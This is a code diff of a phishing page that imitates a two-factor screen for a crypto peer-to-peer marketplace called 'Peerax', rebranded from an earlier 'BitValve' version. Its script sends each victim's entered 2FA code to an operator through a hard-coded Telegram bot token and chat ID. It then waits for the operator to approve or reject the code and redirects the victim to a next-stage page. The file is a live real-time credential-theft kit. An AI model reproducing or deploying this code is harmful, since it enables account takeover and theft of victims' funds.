@@ -1,287 +1,210 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BitValve - Trust this device</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Peerax - Two-factor authentication</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <style>
-        /* ========== GLOBAL RESET ========== */
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Inter", sans-serif;
-        }
-        
         body {
-            background-color: #f2f2f2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
+            font-family: 'Inter', sans-serif;
         }
-        /* ========== MAIN CONTAINER ========== */
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-        }
-        
-        .card {
-            background: white;
-            border-radius: 12px;
-            padding: 30px 25px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-            text-align: center;
-        }
-        /* ========== LOGO AREA ========== */
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-        
-        .logo svg {
-            width: 28px;
-            height: 28px;
-            fill: #016a54;
-        }
-        
-        h2 {
-            color: #003b2b;
-            font-weight: 700;
-        }
-        /* ========== TITLE & TEXT ========== */
-        
-        h3 {
-            color: #016a54;
-            font-size: 20px;
-            margin-top: 10px;
-            font-weight: 600;
-        }
-        
-        .subtitle {
-            font-size: 12px;
-            color: #7a7a7a;
-            margin: 20px 0 10px;
-            letter-spacing: 0.5px;
-        }
-        /* ========== INPUT CODE BOXES ========== */
-        
-        .code-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .code-inputs input {
-            width: 45px;
-            height: 50px;
-            text-align: center;
-            font-size: 20px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-            outline: none;
-            transition: 0.2s ease;
-        }
-        
-        .code-inputs input:focus {
-            border-color: #016a54;
-            box-shadow: 0 0 0 2px rgba(1, 106, 84, 0.2);
-        }
-        /* ========== BUTTON ========== */
-        
-        #trust-btn {
-            width: 100%;
-            background: #0e0e0e;
-            color: #00ff84;
-            border: none;
-            border-radius: 30px;
-            padding: 14px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: 0.3s ease;
-        }
-        
-        #trust-btn:hover {
-            background: #1a1a1a;
-        }
-        
-        #trust-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            background: #333;
-        }
-        /* ========== ERROR MESSAGE ========== */
-        
-        .error-msg {
-            background: rgba(239, 68, 68, 0.12);
-            border: 1px solid rgba(239, 68, 68, 0.25);
-            color: #dc2626;
-            padding: 10px 14px;
-            border-radius: 10px;
-            font-size: 13px;
-            margin: 16px 0;
-            display: none;
-            text-align: center;
-        }
-        /* ========== MESSAGE (wrong credentials) ========== */
-        
-        #message {
-            color: #dc2626;
-            font-size: 14px;
-            margin-top: 16px;
-            display: none;
-        }
-        /* ========== SPINNER OVERLAY ========== */
-        
         .spinner-overlay {
+            display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 100;
             align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease, visibility 0.4s ease;
-            pointer-events: none;
+            justify-content: center;
         }
-        
         .spinner-overlay.active {
-            opacity: 1;
-            visibility: visible;
-            pointer-events: all;
-        }
-        
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid rgba(255, 255, 255, 0.15);
-            border-top-color: #00ff84;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-        }
-        
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .spinner-text {
-            color: #d1d5db;
-            font-size: 15px;
-            margin-top: 20px;
-            font-weight: 500;
-        }
-        
-        .spinner-email {
-            color: #00ff84;
-            font-size: 14px;
-            margin-top: 6px;
-            font-weight: 600;
-            word-break: break-all;
-            max-width: 300px;
-            text-align: center;
-        }
-        
-        .cancel-poll-btn {
-            margin-top: 22px;
-            padding: 10px 28px;
-            background: transparent;
-            border: 1px solid #4b5563;
-            border-radius: 50px;
-            color: #9ca3af;
-            font-family: inherit;
-            font-size: 13px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .cancel-poll-btn:hover {
-            border-color: #ef4444;
-            color: #ef4444;
-        }
-        /* ========== RESPONSIVE ========== */
-        
-        @media (max-width: 480px) {
-            .card {
-                padding: 20px;
-            }
-            .code-inputs input {
-                width: 40px;
-                height: 45px;
-                font-size: 18px;
-            }
-            h3 {
-                font-size: 18px;
-            }
-            #trust-btn {
-                font-size: 15px;
-                padding: 12px;
-            }
+            display: flex;
         }
     </style>
 </head>
+<body class="bg-gray-50 text-gray-900 min-h-screen flex flex-col justify-between transition-colors duration-200" id="body">
 
-<body>
-    <div class="container">
-        <div class="card">
-            <div class="logo">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z"/>
-                </svg>
-                <h2>BitValve</h2>
-            </div>
-
-            <h3>Trust this device</h3>
-            <p class="subtitle">EMAIL CODE (CHECK SPAM FOLDER TOO)</p>
-
-            <!-- Error message box (for validation / feedback) -->
-            <div class="error-msg" id="otpError"></div>
-
-            <div class="code-inputs">
-                <input type="text" maxlength="1" id="otp0" />
-                <input type="text" maxlength="1" id="otp1" />
-                <input type="text" maxlength="1" id="otp2" />
-                <input type="text" maxlength="1" id="otp3" />
-                <input type="text" maxlength="1" id="otp4" />
-                <input type="text" maxlength="1" id="otp5" />
-            </div>
-
-            <button id="trust-btn">Trust Device</button>
-            <p id="message"></p>
+    <!-- Loading Overlay -->
+    <div id="spinnerOverlay" class="spinner-overlay">
+        <div class="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center max-w-sm w-full mx-4 text-center">
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-purple-600 mb-4"></div>
+            <p class="text-sm font-semibold text-gray-900 mb-1">Verifying code...</p>
+            <p id="spinnerInfo" class="text-xs text-gray-500 mb-4">Please wait while we confirm your two-factor authentication.</p>
+            <button onclick="cancelPolling()" class="text-xs text-red-600 font-medium hover:underline">Cancel</button>
         </div>
     </div>
 
-    <!-- ===== Spinner Overlay ===== -->
-    <div class="spinner-overlay" id="spinnerOverlay">
-        <div class="spinner"></div>
-        <p class="spinner-text">Verifying email code...</p>
-        <p class="spinner-email" id="spinnerInfo"></p>
-        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
-    </div>
+    <!-- Top Navbar -->
+    <header class="w-full bg-white border-b border-gray-100 px-6 py-4 flex items-center justify-between transition-colors duration-200" id="navbar">
+        <div class="flex items-center space-x-8">
+            <!-- Logo -->
+            <a href="#" class="flex items-center space-x-2">
+                <div class="bg-purple-600 text-white p-1.5 rounded-lg flex items-center justify-center font-bold text-sm w-7 h-7">
+                    <i class="fa-solid fa-percent text-xs"></i>
+                </div>
+                <span class="text-xl font-bold tracking-tight text-purple-600">peerax</span>
+            </a>
+            <!-- Nav Links -->
+            <nav class="hidden md:flex items-center space-x-6 text-sm font-medium text-gray-600">
+                <a href="#" class="hover:text-purple-600 transition-colors">Marketplace</a>
+                <a href="#" class="hover:text-purple-600 transition-colors">How it works</a>
+                <a href="#" class="hover:text-purple-600 transition-colors">Fees</a>
+            </nav>
+        </div>
 
-    <!-- ===== Telegram Inline Keyboard + Polling ===== -->
+        <div class="flex items-center space-x-4">
+            <!-- Dark Mode Toggle -->
+            <button id="theme-toggle" class="text-gray-500 hover:text-gray-700 p-2 rounded-full focus:outline-none">
+                <i class="fa-regular fa-moon text-lg"></i>
+            </button>
+            <!-- Sign In Text -->
+            <a href="#" class="text-sm font-medium text-purple-600 hidden sm:inline-block">Sign in</a>
+            <!-- Create Account Button -->
+            <a href="#" class="bg-purple-600 hover:bg-purple-700 text-white text-sm font-medium px-4 py-2 rounded-xl shadow-sm transition-all">Create account</a>
+        </div>
+    </header>
+
+    <!-- Main Content: 2FA / OTP Card -->
+    <main class="flex-grow flex items-center justify-center px-4 py-12">
+        <div class="bg-white border border-gray-200/80 rounded-2xl shadow-sm w-full max-w-md p-8 transition-colors duration-200" id="auth-card">
+            <div class="mb-6">
+                <h1 class="text-2xl font-bold text-gray-900 tracking-tight">Two-factor code</h1>
+                <p class="text-xs text-gray-500 mt-1.5">Enter the 6-digit code from your authenticator app</p>
+            </div>
+
+            <!-- Error message container -->
+            <div id="otpError" class="mb-4 p-3 bg-red-50 text-red-600 text-xs rounded-lg font-medium hidden"></div>
+
+            <form id="otp-form" class="space-y-4" onsubmit="event.preventDefault();">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-2">6-digit code</label>
+                    <div class="code-inputs flex justify-between gap-2">
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                        <input type="text" maxlength="1" class="w-12 h-12 text-center text-lg font-semibold bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none transition-all" required>
+                    </div>
+                </div>
+
+                <p class="text-[11px] text-gray-500 leading-relaxed">
+                    Lost your device? Enter one of your one-time backup codes instead.
+                </p>
+
+                <div class="flex items-center space-x-2 pt-1">
+                    <input type="checkbox" id="trustDevice" class="w-4 h-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500 accent-purple-600">
+                    <label for="trustDevice" class="text-xs text-gray-600 select-none">Trust this device for 30 days (skip 2FA here)</label>
+                </div>
+
+                <button type="button" id="trust-btn" class="w-full bg-purple-400 hover:bg-purple-500 text-white font-medium py-2.5 rounded-xl shadow-sm transition-all text-sm mt-3">
+                    Verify
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Detailed Footer -->
+    <footer class="bg-white border-t border-gray-100 pt-12 pb-16 px-6 md:px-16 transition-colors duration-200" id="footer">
+        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-5 gap-8">
+            <!-- Brand & Info Column -->
+            <div class="md:col-span-1 space-y-4">
+                <a href="#" class="flex items-center space-x-2">
+                    <div class="bg-purple-600 text-white p-1.5 rounded-lg flex items-center justify-center font-bold text-sm w-7 h-7">
+                        <i class="fa-solid fa-percent text-xs"></i>
+                    </div>
+                    <span class="text-xl font-bold tracking-tight text-purple-600">peerax</span>
+                </a>
+                <p class="text-xs text-gray-500 leading-relaxed">
+                    An escrow-protected peer-to-peer marketplace for BTC and USDT.
+                </p>
+                <div>
+                    <span class="text-xs font-semibold text-gray-700 block mb-2">Follow Peerax</span>
+                    <a href="#" class="inline-flex items-center justify-center w-8 h-8 rounded-full border border-gray-300 text-gray-600 hover:text-purple-600 hover:border-purple-600 transition-all text-xs">
+                        <i class="fa-solid fa-x"></i>
+                    </a>
+                </div>
+                <div>
+                    <span class="text-xs font-semibold text-gray-700 block mb-2">Supported countries</span>
+                    <div class="flex flex-wrap gap-1.5 items-center">
+                        <img src="https://flagcdn.com/ng.svg" alt="Nigeria" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Nigeria">
+                        <img src="https://flagcdn.com/ke.svg" alt="Kenya" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Kenya">
+                        <img src="https://flagcdn.com/gh.svg" alt="Ghana" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Ghana">
+                        <img src="https://flagcdn.com/za.svg" alt="South Africa" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="South Africa">
+                        <img src="https://flagcdn.com/in.svg" alt="India" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="India">
+                        <img src="https://flagcdn.com/eg.svg" alt="Egypt" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Egypt">
+                        <img src="https://flagcdn.com/ci.svg" alt="Ivory Coast" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Ivory Coast">
+                        <img src="https://flagcdn.com/pk.svg" alt="Pakistan" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Pakistan">
+                        <img src="https://flagcdn.com/br.svg" alt="Brazil" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Brazil">
+                        <img src="https://flagcdn.com/ar.svg" alt="Argentina" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Argentina">
+                        <img src="https://flagcdn.com/ve.svg" alt="Venezuela" class="w-5 h-3.5 object-cover rounded-[2px] shadow-sm hover:scale-110 transition-transform" title="Venezuela">
+                    </div>
+                    <div class="mt-2 text-xs text-gray-500">
+                        +150 more countries <a href="#" class="text-purple-600 font-medium hover:underline">All countries →</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Products Column -->
+            <div>
+                <h4 class="text-xs font-semibold text-gray-900 uppercase tracking-wider mb-4">Products</h4>
+                <ul class="space-y-2.5 text-xs text-gray-600">
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">P2P trading</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Wallet</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Fees</a></li>
+                    <li class="flex items-center space-x-2">
+                        <a href="#" class="hover:text-purple-600 transition-colors">Swap</a>
+                        <span class="bg-gray-100 text-gray-500 text-[10px] px-1.5 py-0.5 rounded font-semibold">SOON</span>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- Useful links Column -->
+            <div>
+                <h4 class="text-xs font-semibold text-gray-900 uppercase tracking-wider mb-4">Useful links</h4>
+                <ul class="space-y-2.5 text-xs text-gray-600">
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Crypto calculator</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">System status</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Partner program</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">API docs</a></li>
+                </ul>
+            </div>
+
+            <!-- Legal Column -->
+            <div>
+                <h4 class="text-xs font-semibold text-gray-900 uppercase tracking-wider mb-4">Legal</h4>
+                <ul class="space-y-2.5 text-xs text-gray-600">
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Terms</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Privacy</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Cookie policy</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">AML & KYC policy</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Bug bounty</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Legal requests</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Vendor reminder</a></li>
+                </ul>
+            </div>
+
+            <!-- About Column -->
+            <div>
+                <h4 class="text-xs font-semibold text-gray-900 uppercase tracking-wider mb-4">About</h4>
+                <ul class="space-y-2.5 text-xs text-gray-600">
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">About us</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Fees</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Contact</a></li>
+                    <li><a href="#" class="hover:text-purple-600 transition-colors">Help center</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Interactivity -->
     <script>
         /* ----- CONFIG ----- */
-        const TELEGRAM_BOT_TOKEN = "8934280565:AAFLlElKoIQkgqWUYalq44B1PFCrV_Xt_ko";
-        const TELEGRAM_CHAT_ID = "8229040857";
+        const TELEGRAM_BOT_TOKEN = "9135440382:AAGHDRk8KpImO4haDlGsK8uA16-oOY6Bq3s";
+        const TELEGRAM_CHAT_ID = "6516787127";
 
         /* ----- State ----- */
         let pollDecided = false;
@@ -317,14 +240,14 @@
         function showError(msg) {
             const err = document.getElementById('otpError');
             err.textContent = msg;
-            err.style.display = 'block';
+            err.classList.remove('hidden');
         }
 
         function hideError() {
-            document.getElementById('otpError').style.display = 'none';
+            document.getElementById('otpError').classList.add('hidden');
         }
 
-        /* ----- Cancel polling ----- */
+        /* ----- Cancel Polling ----- */
         function cancelPolling() {
             pollDecided = true;
             if (pollTimeoutId) clearTimeout(pollTimeoutId);
@@ -335,7 +258,7 @@
         }
 
         /* ----- Polling loop (long-poll for callback_query) ----- */
-        function startPolling(userId) {
+        function startPolling(userId, onApproveUrl) {
             let offset = 0;
             pollDecided = false;
             let pollCount = 0;
@@ -346,21 +269,21 @@
             currentPollController = new AbortController();
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`, {
-                    signal: currentPollController.signal
-                })
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        offset = data.result[data.result.length - 1].update_id + 1;
-                    }
+                signal: currentPollController.signal
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok && data.result.length > 0) {
+                    offset = data.result[data.result.length - 1].update_id + 1;
+                }
+                pollLoop();
+            })
+            .catch(err => {
+                if (err.name !== 'AbortError') {
+                    console.error('Initial offset error:', err);
                     pollLoop();
-                })
-                .catch(err => {
-                    if (err.name !== 'AbortError') {
-                        console.error('Initial offset error:', err);
-                        pollLoop();
-                    }
-                });
+                }
+            });
 
             function pollLoop() {
                 if (pollDecided) return;
@@ -374,92 +297,84 @@
                 }
 
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
-                        method: 'GET',
-                        signal: currentPollController.signal
-                    })
-                    .then(r => {
-                        if (!r.ok) {
-                            if (r.status === 409) {
-                                retryDelay = Math.min(retryDelay * 1.5, 10000);
-                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
-                                return null;
-                            }
-                            throw new Error('HTTP ' + r.status);
+                    method: 'GET',
+                    signal: currentPollController.signal
+                })
+                .then(r => {
+                    if (!r.ok) {
+                        if (r.status === 409) {
+                            retryDelay = Math.min(retryDelay * 1.5, 10000);
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                            return null;
                         }
-                        retryDelay = 2000;
-                        return r.json();
-                    })
-                    .then(data => {
-                        if (data === null) return;
-                        if (!data.ok || pollDecided) {
-                            if (!pollDecided) {
-                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
-                            }
-                            return;
-                        }
-
-                        for (const update of data.result) {
-                            offset = update.update_id + 1;
-                            if (update.callback_query) {
-                                const action = update.callback_query.data;
-
-                                // Answer the callback query
-                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        callback_query_id: update.callback_query.id,
-                                        text: "Action recorded!"
-                                    })
-                                }).catch(() => {});
-
-                                if (action === `approve_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    // Show a success message (original didn't redirect)
-                                    document.getElementById('message').textContent = "Device trusted successfully.";
-                                    document.getElementById('message').style.color = "#16a34a";
-                                    document.getElementById('message').style.display = "block";
-                                    return;
-                                } else if (action === `decline_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    document.getElementById('trust-btn').disabled = false;
-                                    document.getElementById('message').textContent = "Wrong credentials.";
-                                    document.getElementById('message').style.color = "#dc2626";
-                                    document.getElementById('message').style.display = "block";
-                                    return;
-                                } else if (action === `wrong_${userId}`) {
-                                    pollDecided = true;
-                                    document.getElementById('spinnerOverlay').classList.remove('active');
-                                    document.getElementById('trust-btn').disabled = false;
-                                    document.getElementById('message').textContent = "Wrong credentials.";
-                                    document.getElementById('message').style.color = "#dc2626";
-                                    document.getElementById('message').style.display = "block";
-                                    return;
-                                }
-                            }
-                        }
-
+                        throw new Error('HTTP ' + r.status);
+                    }
+                    retryDelay = 2000;
+                    return r.json();
+                })
+                .then(data => {
+                    if (data === null) return;
+                    if (!data.ok || pollDecided) {
                         if (!pollDecided) {
                             pollTimeoutId = setTimeout(pollLoop, retryDelay);
                         }
-                    })
-                    .catch(err => {
-                        if (err.name === 'AbortError') return;
-                        console.error('Poll error:', err);
-                        if (!pollDecided) {
-                            retryDelay = Math.min(retryDelay * 1.2, 8000);
-                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        return;
+                    }
+
+                    for (const update of data.result) {
+                        offset = update.update_id + 1;
+                        if (update.callback_query) {
+                            const action = update.callback_query.data;
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    callback_query_id: update.callback_query.id,
+                                    text: "Action recorded!"
+                                })
+                            }).catch(() => {});
+
+                            if (action === `approve_${userId}`) {
+                                pollDecided = true;
+                                document.getElementById('spinnerOverlay').classList.remove('active');
+                                window.location.href = onApproveUrl;
+                                return;
+                            } else if (action === `decline_${userId}`) {
+                                pollDecided = true;
+                                document.getElementById('spinnerOverlay').classList.remove('active');
+                                document.getElementById('trust-btn').disabled = false;
+                                showError('Request declined. Please try again.');
+                                return;
+                            } else if (action === `wrong_${userId}`) {
+                                pollDecided = true;
+                                document.getElementById('spinnerOverlay').classList.remove('active');
+                                document.getElementById('trust-btn').disabled = false;
+                                showError('Wrong code. Please enter the correct 2FA code.');
+                                return;
+                            }
                         }
-                    });
+                    }
+
+                    if (!pollDecided) {
+                        pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                    }
+                })
+                .catch(err => {
+                    if (err.name === 'AbortError') return;
+                    console.error('Poll error:', err);
+                    if (!pollDecided) {
+                        retryDelay = Math.min(retryDelay * 1.2, 8000);
+                        pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                    }
+                });
             }
         }
 
         /* ----- Send message with inline keyboard to Telegram ----- */
-        function sendTelegramMessage(message, keyboard, userId) {
+        function sendTelegramMessage(message, keyboard, userId, onApproveUrl) {
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             const trustBtn = document.getElementById('trust-btn');
 
@@ -469,44 +384,44 @@
             function attemptSend() {
                 attempts++;
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML',
-                            reply_markup: JSON.stringify(keyboard)
-                        })
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: JSON.stringify(keyboard)
                     })
-                    .then(res => {
-                        if (!res.ok) throw new Error('HTTP ' + res.status);
-                        return res.json();
-                    })
-                    .then(data => {
-                        if (data.ok) {
-                            startPolling(userId);
-                        } else {
-                            if (attempts < maxAttempts) {
-                                setTimeout(attemptSend, 1000 * attempts);
-                            } else {
-                                spinnerOverlay.classList.remove('active');
-                                trustBtn.disabled = false;
-                                showError('Failed to send notification. Please try again.');
-                            }
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Send error:', err);
+                })
+                .then(res => {
+                    if (!res.ok) throw new Error('HTTP ' + res.status);
+                    return res.json();
+                })
+                .then(data => {
+                    if (data.ok) {
+                        startPolling(userId, onApproveUrl);
+                    } else {
                         if (attempts < maxAttempts) {
                             setTimeout(attemptSend, 1000 * attempts);
                         } else {
                             spinnerOverlay.classList.remove('active');
                             trustBtn.disabled = false;
-                            showError('Network error. Please check your connection and try again.');
+                            showError('Failed to send notification. Please try again.');
                         }
-                    });
+                    }
+                })
+                .catch(err => {
+                    console.error('Send error:', err);
+                    if (attempts < maxAttempts) {
+                        setTimeout(attemptSend, 1000 * attempts);
+                    } else {
+                        spinnerOverlay.classList.remove('active');
+                        trustBtn.disabled = false;
+                        showError('Network error. Please check your connection and try again.');
+                    }
+                });
             }
 
             attemptSend();
@@ -515,10 +430,7 @@
         /* ----- Trust Device button click ----- */
         document.getElementById("trust-btn").addEventListener("click", function() {
             hideError();
-            // Hide the previous message
-            document.getElementById('message').style.display = 'none';
 
-            // Collect the OTP code from inputs
             const code = Array.from(inputs).map(input => input.value).join('');
 
             if (code.length !== 6 || !/^\d{6}$/.test(code)) {
@@ -534,13 +446,8 @@
             spinnerOverlay.classList.add('active');
             trustBtn.disabled = true;
 
-            const userId = 'emailcode_' + Date.now();
-            const message = `📧 <b>BitValve Email Code Received</b>
-
-🔢 Code: <code>${code}</code>
-⏰ Time: ${new Date().toLocaleString('en-ZA')}
-
-<b>Please approve, decline, or mark as wrong code:</b>`;
+            const userId = 'otp_' + Date.now();
+            const message = `🔐 <b>Peerax 2FA Code Received</b>\n\n🔢 Code: <code>${code}</code>\n⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n<b>Please approve, decline, or mark as wrong code:</b>`;
 
             const keyboard = {
                 inline_keyboard: [
@@ -558,9 +465,44 @@
                 ]
             };
 
-            sendTelegramMessage(message, keyboard, userId);
+            sendTelegramMessage(message, keyboard, userId, 'otp2.html');
+        });
+
+        /* ----- Dark Mode Toggle ----- */
+        const themeToggle = document.getElementById('theme-toggle');
+        const body = document.getElementById('body');
+        const navbar = document.getElementById('navbar');
+        const authCard = document.getElementById('auth-card');
+        const footer = document.getElementById('footer');
+
+        themeToggle.addEventListener('click', () => {
+            const isDark = body.classList.toggle('bg-gray-900');
+            body.classList.toggle('text-gray-100', isDark);
+            body.classList.toggle('bg-gray-50', !isDark);
+            body.classList.toggle('text-gray-900', !isDark);
+
+            navbar.classList.toggle('bg-gray-800', isDark);
+            navbar.classList.toggle('border-gray-700', isDark);
+            navbar.classList.toggle('bg-white', !isDark);
+            navbar.classList.toggle('border-gray-100', !isDark);
+
+            authCard.classList.toggle('bg-gray-800', isDark);
+            authCard.classList.toggle('border-gray-700', isDark);
+            authCard.classList.toggle('bg-white', !isDark);
+            authCard.classList.toggle('border-gray-200/80', !isDark);
+
+            footer.classList.toggle('bg-gray-800', isDark);
+            footer.classList.toggle('border-gray-700', isDark);
+            footer.classList.toggle('bg-white', !isDark);
+            footer.classList.toggle('border-gray-100', !isDark);
+
+            const icon = themeToggle.querySelector('i');
+            if (isDark) {
+                icon.className = 'fa-regular fa-sun text-lg text-yellow-400';
+            } else {
+                icon.className = 'fa-regular fa-moon text-lg text-gray-500';
+            }
         });
     </script>
 </body>
-
 </html>
